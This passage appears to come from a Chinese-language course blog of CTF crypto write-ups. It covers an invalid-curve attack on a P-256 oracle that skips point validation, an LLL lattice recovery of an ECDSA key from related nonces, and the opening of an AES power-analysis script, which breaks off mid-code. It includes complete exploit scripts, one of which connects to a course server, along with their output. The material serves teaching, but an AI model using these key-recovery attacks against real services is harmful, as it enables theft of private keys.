因此對一個 $P \\notin E$ 的點做 scalar multiplication 相當於在另一個 $b\u0026rsquo; \\neq b$ 的 $E\u0026rsquo;: y^2 = x^3 + ax + b\u0026rsquo;$ 上運算。\n這會帶來的問題是 $E\u0026rsquo;$ 通常和特別選過的 $E$ 不同，它的 curve order $#(E\u0026rsquo;)=n$ 分解後不一定都有個 large prime order subgroup 存在。當 $E\u0026rsquo;$ 上存在一個 order 為 $f$ 的 small subgroup 時，我們可以將原本 $Q=dP$ 的問題轉換成 $(n/f)Q=d((n/f)P)$，然後就能在短時間內解出 $d \\bmod{f}$ 的值。\n所以只要有多個夠小的 $f_1, f_2, f_3, \\cdots$，利用上面的方法找出 $d_i \\equiv d \\pmod{f_i}$，然後利用 CRT 就能算出 $d \\bmod{\\prod_{i=1}^{b} f_i}$ 的結果。因此要得到真正的 $d$ 就得找出足夠多的 $f_i$ 使得 $\\prod_{i=1}^{b} f_i \u0026gt; n \u0026gt; d$ 才行。\n當然，一個 $E\u0026rsquo;$ 通常不會提供這麼多的 $f_i$ 能達成這個條件，所以會有多個 $E\u0026rsquo;, E\u0026rsquo;\u0026rsquo;, E\u0026rsquo;\u0026rsquo;\u0026rsquo;, \\cdots$ 分別提供不同的 $f_i$，然後用一樣的方法在 subgroup 中解 DLP，最後應用 CRT 即可求出需要的 $d$。\n這題原先的曲線 $E$ 是 NIST P-256，所以我先將 $a$ 固定，然後暴力搜尋其他不同的 $b\u0026rsquo;$ 得到 $E\u0026rsquo;$，把夠小的 $f_i$ 紀錄下來。這部分可以參考 find_curves.sage。\n為了減少之後的計算量，我把 $b\u0026rsquo;$, $E\u0026rsquo;$ 上的 generator $G\u0026rsquo;$, $#(E\u0026rsquo;)$ 還有 $f_i$ 都記錄了下來\n剩下就是利用這些預先計算好的參數，將各個 $E\u0026rsquo;$ 的 $G\u0026rsquo;$ 當作 public key $P$ 傳給 oracle，然後得到 $Q=dP$，然後用前面的方法得到 $d \\equiv d \\pmod{f_i}$ 的值，最後使用 CRT 求回 $d$ 即可。\nSource code # :::spoiler Server\nfrom sage.all import * from elliptic_curve_97cadb52fbd7b2cd import Curve, Point from Crypto.Util.number import bytes_to_long from secret import FLAG # NIST P-256 p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 print(\u0026#34;Give me a G and I will give you the hint.\u0026#34;) E = Curve(p, a, b) Gx = int(input(\u0026#34;Gx: \u0026#34;)) Gy = int(input(\u0026#34;Gy: \u0026#34;)) G = Point(E, Gx, Gy) hint = G * bytes_to_long(FLAG) print(hint) :::\n:::spoiler Self-Defined Elliptic Curve\n# Reference: https://github.com/maple3142/My-CTF-Challenges/blob/7d9141ac7b61fdbb71f29c07d489018d7c0a0aaa/AIS3%20Pre-exam%202022/pekobot/README.md class Curve: def __init__(self, p, a, b): self.p = p self.a = a self.b = b def __eq__(self, other): if isinstance(other, Curve): return self.p == other.p and self.a == other.a and self.b == other.b return None def __str__(self): return \u0026#34;y^2 = x^3 + %dx + %d over F_%d\u0026#34; % (self.a, self.b, self.p) class Point: def __init__(self, curve, x, y): if curve == None: self.curve = self.x = self.y = None return self.curve = curve self.x = x % curve.p self.y = y % curve.p def __str__(self): if self == INFINITY: return \u0026#34;INF\u0026#34; return \u0026#34;(%d, %d)\u0026#34; % (self.x, self.y) def __eq__(self, other): if isinstance(other, Point): return self.curve == other.curve and self.x == other.x and self.y == other.y return None def __add__(self, other): if not isinstance(other, Point): return None if other == INFINITY: return self if self == INFINITY: return other p = self.curve.p if self.x == other.x: if (self.y + other.y) % p == 0: return INFINITY else: return self.double() p = self.curve.p l = ((other.y - self.y) * pow(other.x - self.x, -1, p)) % p x3 = (l * l - self.x - other.x) % p y3 = (l * (self.x - x3) - self.y) % p return Point(self.curve, x3, y3) def __neg__(self): return Point(self.curve, self.x, self.curve.p - self.y) def __mul__(self, e): if e == 0: return INFINITY if self == INFINITY: return INFINITY if e \u0026lt; 0: return (-self) * (-e) ret = self * (e // 2) ret = ret.double() if e % 2 == 1: ret = ret + self return ret def __rmul__(self, other): return self * other def double(self): if self == INFINITY: return INFINITY p = self.curve.p a = self.curve.a l = ((3 * self.x * self.x + a) * pow(2 * self.y, -1, p)) % p x3 = (l * l - 2 * self.x) % p y3 = (l * (self.x - x3) - self.y) % p return Point(self.curve, x3, y3) INFINITY = Point(None, None, None) :::\nRecon # 觀察source code會發現maple實作了一個沒有檢查我們傳送的點是否在一開始創的橢圓曲線上的elliptiv curve class，然後他把我們給的point當作參數，創立一個初始點，可以看一下下面裡個範例，如果是maple的實作，給予一個根本不在該Elliptic Curve的點他還是會算一個G+G的點給你，只是該點其實是在別的曲線上的2G這個點，反觀正常的sage中的實作會發現只要給予的點不在該曲線上就會直接報錯 :::spoiler maple 實作的Elliptic Curve\n\u0026gt;\u0026gt;\u0026gt; from elliptic_curve_97cadb52fbd7b2cd import Curve, Point \u0026gt;\u0026gt;\u0026gt; p=23 \u0026gt;\u0026gt;\u0026gt; a=5 \u0026gt;\u0026gt;\u0026gt; b=1 \u0026gt;\u0026gt;\u0026gt; E = Curve(p, a, b) \u0026gt;\u0026gt;\u0026gt; G = Point(E, 4, 4) \u0026gt;\u0026gt;\u0026gt; print(G) (4, 4) \u0026gt;\u0026gt;\u0026gt; print(G+G) (19, 3) \u0026gt;\u0026gt;\u0026gt; fake_G = Point(E, 4, 3) \u0026gt;\u0026gt;\u0026gt; print(fake_G+fake_G) (17, 1) :::\n:::spoiler 正常的Elliptic Curve\n\u0026gt;\u0026gt;\u0026gt; from sage.all import * \u0026gt;\u0026gt;\u0026gt; p=23 \u0026gt;\u0026gt;\u0026gt; a=5 \u0026gt;\u0026gt;\u0026gt; b=1 \u0026gt;\u0026gt;\u0026gt; E = EllipticCurve(Zmod(p), [a, b]) \u0026gt;\u0026gt;\u0026gt; G = E(4, 4) \u0026gt;\u0026gt;\u0026gt; print(G) (4 : 4 : 1) \u0026gt;\u0026gt;\u0026gt; fake_G = E(4, 3) Traceback (most recent call last): File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 839, in sage.structure.category_object.CategoryObject.getattr_from_category (build/cythonized/sage/structure/category_object.c:7216) KeyError: \u0026#39;point_homset\u0026#39; During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/projective/projective_subscheme.py\u0026#34;, line 122, in point return self._point(self.point_homset(), v, check=check) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 259, in __init__ point_homset = curve.point_homset() ^^^^^^^^^^^^^^^^^^ File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 833, in sage.structure.category_object.CategoryObject.__getattr__ (build/cythonized/sage/structure/category_object.c:7135) File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 848, in sage.structure.category_object.CategoryObject.getattr_from_category (build/cythonized/sage/structure/category_object.c:7301) File \u0026#34;sage/cpython/getattr.pyx\u0026#34;, line 356, in sage.cpython.getattr.getattr_from_other_class (build/cythonized/sage/cpython/getattr.c:2717) AttributeError: \u0026#39;IntegerModRing_generic_with_category\u0026#39; object has no attribute \u0026#39;__custom_name\u0026#39; During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_generic.py\u0026#34;, line 582, in __call__ return plane_curve.ProjectivePlaneCurve.__call__(self, *args, **kwds) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/generic/scheme.py\u0026#34;, line 266, in __call__ return self.point(args) ^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/projective/projective_subscheme.py\u0026#34;, line 124, in point return self._point(self, v, check=check) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 298, in __init__ raise TypeError(\u0026#34;Coordinates %s do not define a point on %s\u0026#34; % (list(v), curve)) TypeError: Coordinates [4, 3, 1] do not define a point on Elliptic Curve defined by y^2 = x^3 + 5*x + 1 over Ring of integers modulo 23 :::\n有了這個性質就可以回去參考一下maple在github上的說明，我們要解決的問題是$hint=Gflag$中的flag到底是甚麼，如果是像前面舉例的那樣($p=23/a=5/b=1/order=31$)很小的order，其實只要直接算discrete_log(K, G, operation='+')就可以了，範例如下，可以看到我先定義K = E(19, 3)，算出discete log=28，事後驗證也證明$K=28G$。但是，像題目中這樣這麼大的order，如果要計算discrete_log的話會非常非常久的時間，總之我先往smooth order的方向思考，也就是說order被factor後其實是由好幾個小的prime所組成，我是直接調整$b$這個不會被Elliptic Curve Multiplication運算使用到的參數(代表其他參數$p, a$要照舊)，然後factor曲線的order看夠不夠smooth，但這樣找也一樣要非常非常久，或者說找到的$b$所得到的order都不夠smooth，最大的prime都還是超過$2^{65}$(e.g. 範例如下)\n\u0026gt;\u0026gt;\u0026gt; G = E.gen(0) \u0026gt;\u0026gt;\u0026gt; print(G) (15 : 1 : 1) \u0026gt;\u0026gt;\u0026gt; K = E(19, 3) \u0026gt;\u0026gt;\u0026gt; discrete_log(K, G, operation=\u0026#39;+\u0026#39;) 28 \u0026gt;\u0026gt;\u0026gt; 28 * G (19 : 3 : 1) sage: p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff ....: a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc ....: b = 56 sage: E = EllipticCurve(Zmod(p), [a, b]) sage: factor(E.order()) 3^3 * 13967 * 67679 * 559243 * 11024719 * 127273871 * 1213196727283 * 171447020014729 * 27796463802665410393 sage: 27796463802665410393.bit_length() 65 所以我開始朝maple的說明繼續前進，如果有invalid curve的問題就可以考慮用Pohlig–Hellman algorithm的方法求出flag為多少，就如同maple在background中提到的，我們選擇不同的$b$所產生的Elliptic Curve Order被factor後不一定有一個超大prime存在，因此我們就可以把問題簡化($n$就是改變$b$之後取得的Elliptic Curve Order) $$ hint=flag*G\\ \\hookrightarrow {n \\over prime}hint=flag\u0026rsquo;\\times {n\\over prime} G\\ flag\u0026rsquo;=discrete_log({n \\over prime}hint, {n\\over prime} G, operation=\u0026rsquo;+\u0026rsquo;) $$\n等我們找到很多個$b$就可以找到很多不同的$flag\u0026rsquo;$，最後我們再用CRT找出真正的$flag$為何就可以了，也就是 $$ flag\\equiv flag\u0026rsquo;\\ (mod\\ prime_1)\\ flag\\equiv flag\u0026rsquo;\u0026rsquo;\\ (mod\\ prime_2)\\ flag\\equiv flag\u0026rsquo;\u0026rsquo;\u0026rsquo;\\ (mod\\ prime_3)\\ \u0026hellip; $$ 所以重點在於要找到足夠多的$flag\u0026rsquo;$和$prime_n$組合\nExploit # 實作的部分主要是參考1的幫忙，大致上就和上面提到的差不多\nfrom sage.all import * from Crypto.Util.number import bytes_to_long, getPrime, long_to_bytes from pwn import * # NIST P-256 p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc def solveDL(): b = randint(1, p) E = EllipticCurve(Zmod(p), [a, b]) G = E.gen(0) order = E.order() # print(order) factors = prime_factors(order) # print(factors) valid = [] for factor in factors: if factor \u0026lt;= 2**40: valid.append(factor) prime = valid[-1] new_G = G * int(order / prime) tmp_point = new_G.xy() tmp_x, tmp_y = str(tmp_point[0]), str(tmp_point[1]) try: r = remote(\u0026#39;10.113.184.121\u0026#39;, 10034) r.recvline() r.sendlineafter(b\u0026#39;Gx: \u0026#39;, tmp_x.encode()) r.sendlineafter(b\u0026#39;Gy: \u0026#39;, tmp_y.encode()) hint = r.recvline().decode().strip() ct_x, ct_y = hint.rstrip(\u0026#39;)\u0026#39;).lstrip(\u0026#39;(\u0026#39;).split(\u0026#39;, \u0026#39;) r.close() except Exception as e: r.close() print(e) return None, None # print(f\u0026#39;Position (ct_x, ct_y) = ({ct_x}, {ct_y})\u0026#39;) new_hint = E(int(ct_x), int(ct_y)) aprt_of_flag = discrete_log(new_hint, new_G, operation=\u0026#39;+\u0026#39;) print(f\u0026#34;Flag\u0026#39; found: {aprt_of_flag}\u0026#34;) return (aprt_of_flag, prime) def getDLs(): dlogs = [] primes = [] for i in range(1, 16): log, prime = solveDL() if log != None: dlogs.append(log) primes.append(prime) print(f\u0026#34;counter: {i}\u0026#34;) return dlogs, primes dlogs, primes = getDLs() print(f\u0026#34;dlogs: {dlogs}\u0026#34;) print(f\u0026#34;primes: {primes}\u0026#34;) super_secret = CRT_list(dlogs, primes) print(f\u0026#39;Flag: {long_to_bytes(super_secret).decode()}\u0026#39;) :::spoiler Result\n$ $ python exp.py [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 27360610332 counter: 1 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 1023158172 counter: 2 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 19279 counter: 3 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 99180577 counter: 4 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 not enough values to unpack (expected 2, got 1) counter: 5 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 1431258 counter: 6 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 152629534 counter: 7 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 36835 counter: 8 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 15673959 counter: 9 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 301945137539 counter: 10 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 2906 counter: 11 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 111332288773 counter: 12 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 245821 counter: 13 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 Flag\u0026#39; found: 7711492 counter: 14 [+] Opening connection to 10.113.184.121 on port 10034: Done [*] Closed connection to 10.113.184.121 port 10034 not enough values to unpack (expected 2, got 1) counter: 15 dlogs: [27360610332, 1023158172, 19279, 99180577, 1431258, 152629534, 36835, 15673959, 301945137539, 2906, 111332288773, 245821, 7711492] primes: [144923720933, 357189282511, 62189, 572762753, 1649429, 172592237, 163171, 34381453, 443616973637, 11159, 568852214543, 371177, 8924527] Flag: FLAG{YouAreARealECDLPMaster} :::\nFlag: FLAG{YouAreARealECDLPMaster}\nReference # Business CTF 2022: Invalid curve attack - 400 Curves\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":372,"href":"/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/","title":"Simple Crypto 0x12(2023 HW - signature_revenge)","section":"Securities","content":" Simple Crypto 0x12(2023 HW - signature_revenge) # Background # Source code # :::spoiler Source Code\nfrom Crypto.Util.number import * from hashlib import sha256, md5 from ecdsa import SECP256k1 from ecdsa.ecdsa import Public_key, Private_key from secret import FLAG import os E = SECP256k1 G, n = E.generator, E.order d = bytes_to_long( os.urandom(32 - len(FLAG)) + FLAG ) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) magic1 = md5(d.to_bytes(32, \u0026#34;big\u0026#34;)).digest() magic2 = md5(d.to_bytes(32, \u0026#34;big\u0026#34;)[::-1]).digest() h1 = sha256(b\u0026#34;https://www.youtube.com/watch?v=IBnrn2pnPG8\u0026#34;).digest() h2 = sha256(b\u0026#34;https://www.youtube.com/watch?v=1H2cyhWYXrE\u0026#34;).digest() k1 = bytes_to_long(magic1 + magic2) k2 = bytes_to_long(magic2 + magic1) sig1 = prikey.sign(bytes_to_long(h1), k1) sig2 = prikey.sign(bytes_to_long(h2), k2) print(f\u0026#39;P = ({pubkey.point.x()}, {pubkey.point.y()})\u0026#39;) print(f\u0026#39;sig1 = ({sig1.r}, {sig1.s})\u0026#39;) print(f\u0026#39;sig2 = ({sig2.r}, {sig2.s})\u0026#39;) # P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968) # sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236) # sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906) :::\nRecon # 仔細看source code會發現他和上課講的例子很不一樣，上課講的方式是考慮已知$k1$, $k2$的長度是符合用lattice找的情況，用LLL找到$k1, k2$再回推d，但這一題一開始遇到最大的困難在於 $$ k_1=2^{128} magic_1+magic_2\\ k_2=2^{128} magic_2+magic_1 $$ 很明顯$k_1, k_2$的bit_length都已經超過用Lattice找的範圍($K\u0026lt;n^{1\\over 2}$，所以如果換個想法呢?我們不找$k_1, k_2$，我們改找$magic_1, magic_2$，之後再回推$k_1, k_2$再回推$d$是不是和原本的目的一樣，設想:\n$k_1 + tk_2 + u \\equiv 0\\ (mod\\ n)$ $\\to magic_12^{128} + magic_2 + t(magic_22^{128} + magic_1) + u \\equiv 0 (mod\\ n)$ $\\to (t+2^{128})magic_1 + (1 + t2^{128})magic_2+u\\equiv 0 (mod\\ n)$ $\\to magic_1+(1 + t2^{128})(t+2^{128})^{-1}magic_2+(t+2^{128})^{-1}u\\equiv 0 (mod\\ n)$ 此時新的$t,u$ $$ new_t=(1 + t2^{128})(t+2^{128})^{-1}\\ new_u=(t+2^{128})^{-1}u $$\n接著就是我一直困惑的地方，也是非常需要感謝Yaan的地方，LLL算出來是三個basi，然後做線性組合才會是投影片上的$vec=(-k1, k2, K)$(或是有一定的倍數)，並不是一開就會是那個vector\nExploit - Lattice # 建立已知的訊息\nE = SECP256k1 G, n = E.generator, E.order P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968) sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236) sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906) h1 = bytes_to_long(sha256(b\u0026#34;https://www.youtube.com/watch?v=IBnrn2pnPG8\u0026#34;).digest()) h2 = bytes_to_long(sha256(b\u0026#34;https://www.youtube.com/watch?v=1H2cyhWYXrE\u0026#34;).digest()) 實作一下原本的公式\nr1, s1 = sig1 r2, s2 = sig2 s1_inv = inverse(s1, n) s2_inv = inverse(s2, n) r1_inv = inverse(r1, n) r2_inv = inverse(r2, n) t = -s1_inv * s2 * r1 * r2_inv u = s1_inv * r1 * h2 * r2_inv - s1_inv * h1 b_matrix_K = 2**128 dommy = 2**128 建立B matrix\nnew_t = (1 + dommy * t) * inverse((dommy + t), n) new_u = u * inverse((dommy + t), n) b_matrix = [ [int(n.digits()), 0, 0], [new_t, 1, 0], [new_u, 0, b_matrix_K] ] 解LLL找最小的vector\nLLL_reduced_basis = matrix(b_matrix).LLL() basis0 = LLL_reduced_basis[0] basis1 = LLL_reduced_basis[1] basis2 = LLL_reduced_basis[2] print(basis0, basis1, basis2) 有了$magic_1, magic_2$之後就可以爆搜找$d$，並還原出原本的flag $\\to$ 非常感謝Yaan提供script給我參考，最主要是這邊有障礙，首先可以先看一下找到的LLL長怎樣\n(-221227854189652752387006500971265535677, 154796202886613489929017650654193194295, 0) (-78316557126501995251733139438552596659, 1809028261633383948620558940699892506, 340282366920938463463374607431768211456) (-190260135239507154352414451870270937822, -390278805794181212650296278313898033211, 0) 會發現只有basis1的後面是跟著K，代表線性組合的係數$j$不能為零，因為這樣就會讓我們想要的vector(-m1, m2, K)的最後那個K不是K而是零，而且後面在算factor的inverse時也會出現錯誤，所以詳細的推倒會變成: $$ \\begin{aligned} vector\u0026amp;=ibasis_0+jbasis_1+kbasis_2\\ =\u0026amp;(ibasis_0[x]+jbasis_1[x]+kbasis_2[x]\\ \u0026amp;,ibasis_0[y]+jbasis_1[y]+kbasis_2[y]\\ \u0026amp;,ibasis_0[z]+jbasis_1[z]+kbasis_2[z])\\ \u0026amp;= (-jm1, jm2, jK) \\end{aligned} $$ 可以看一下為甚麼會變成這樣，原因是從LLL找到的basis，第一個和第三個basis，他們的最後一個dimension都是零，代表vector的最後一個dimension$\\to ibasis_0[z]+jbasis_1[z]+kbasis_2[z] = j*basis_1[z]$，所以當我們找到正確的i, j, k時，要記得把$j$取inverse除掉，才會是正確的$maic_1, magic_2$\n有了$magic_1, magic_2$之後，就是找$k_1$和$d$，最後我們就可以拿到flag了\ndef verify(d): return b\u0026#34;FLAG\u0026#34; in long_to_bytes(d) for i in range(-10,10): for j in range(-10,10): for k in range(-10, 10): if not j: continue vec = i*basis0 + j*basis1 + k*basis2 factor_inv = pow(j,-1,n) m1 = -(factor_inv*vec[0]) m2 = factor_inv*vec[1] k1 = m1*(2**128)+m2 d = ((s1*k1-h1)*r1_inv)%n if verify(d): print(long_to_bytes(d)) check_flag = True break if check_flag: break if check_flag: break :::spoiler 完整的script\nfrom Crypto.Util.number import * from hashlib import sha256, md5 from ecdsa import SECP256k1 from secret import FLAG E = SECP256k1 G, n = E.generator, E.order P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968) sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236) sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906) h1 = bytes_to_long(sha256(b\u0026#34;https://www.youtube.com/watch?v=IBnrn2pnPG8\u0026#34;).digest()) h2 = bytes_to_long(sha256(b\u0026#34;https://www.youtube.com/watch?v=1H2cyhWYXrE\u0026#34;).digest()) r1, s1 = sig1 r2, s2 = sig2 s1_inv = inverse(s1, n) s2_inv = inverse(s2, n) r1_inv = inverse(r1, n) r2_inv = inverse(r2, n) t = -s1_inv * s2 * r1 * r2_inv u = s1_inv * r1 * h2 * r2_inv - s1_inv * h1 b_matrix_K = 2**128 dommy = 2**128 new_t = (1 + dommy * t) * inverse((dommy + t), n) new_u = u * inverse((dommy + t), n) b_matrix = [ [int(n.digits()), 0, 0], [new_t, 1, 0], [new_u, 0, b_matrix_K] ] LLL_reduced_basis = matrix(b_matrix).LLL() basis0 = LLL_reduced_basis[0] basis1 = LLL_reduced_basis[1] basis2 = LLL_reduced_basis[2] print(basis0, basis1, basis2) def verify(d): return b\u0026#34;FLAG\u0026#34; in long_to_bytes(d) for i in range(-10,10): for j in range(-10,10): for k in range(-10, 10): if not j: continue vec = i*basis0 + j*basis1 + k*basis2 factor_inv = pow(j,-1,n) m1 = -(factor_inv*vec[0]) m2 = factor_inv*vec[1] k1 = m1*(2**128)+m2 d = ((s1*k1-h1)*r1_inv)%n if verify(d): print(long_to_bytes(d)) check_flag = True break if check_flag: break if check_flag: break # (-221227854189652752387006500971265535677, 154796202886613489929017650654193194295, 0) (-78316557126501995251733139438552596659, 1809028261633383948620558940699892506, 340282366920938463463374607431768211456) (-190260135239507154352414451870270937822, -390278805794181212650296278313898033211, 0) # b\u0026#39;\\xad\\xc4u\\xcf\\x11\\x1f\\xd7R$FLAG{LLLisreaLLyusefuL}\u0026#39; :::\nFlag: FLAG{LLLisreaLLyusefuL}\n"},{"id":373,"href":"/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/","title":"Simple Crypto 0x13(2023 HW - Power Analysis)","section":"Securities","content":" Simple Crypto 0x13(2023 HW - Power Analysis) # Background # [edu-ctf 2023] week04 - crypto3 [1:30:36]\nSource code # json file recorded by TA\nRecon # 這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:\nPreprocessing 也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起\u0026hellip;) 計算和sbox key XOR的結果 查表sbox 計算hamming weight model 計算和trace的correlation coefficient 看哪一個結果的數值最大，並把index結果記錄下來算它的ascii repeat以上操作後共可得16 bytes的flag 加速的方法: 可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原 Exploit # import json from tqdm import trange import numpy as np import copy from string import ascii_letters, digits from numpy import corrcoef jsonFile = open(\u0026#39;./Crypto/HW3/traces.json\u0026#39;, \u0026#39;r\u0026#39;) j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_preprocess(json_data): pt_col = [] ct_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] tmp_ct_col = [] for trace_idx in range(len(json_data)): tmp_pt_col.append(json_data[trace_idx][\u0026#39;pt\u0026#39;][bytes]) tmp_ct_col.append(json_data[trace_idx][\u0026#39;ct\u0026#39;][bytes]) pt_col.append(tmp_pt_col) ct_col.append(tmp_ct_col) for point in range(len(json_data[0][\u0026#39;pm\u0026#39;])): tmp_trace_col = [] for trace_idx in range(len(json_data)): tmp_trace_col.append(json_data[trace_idx][\u0026#39;pm\u0026#39;][point]) trace_col.append(tmp_trace_col) return pt_col, ct_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def 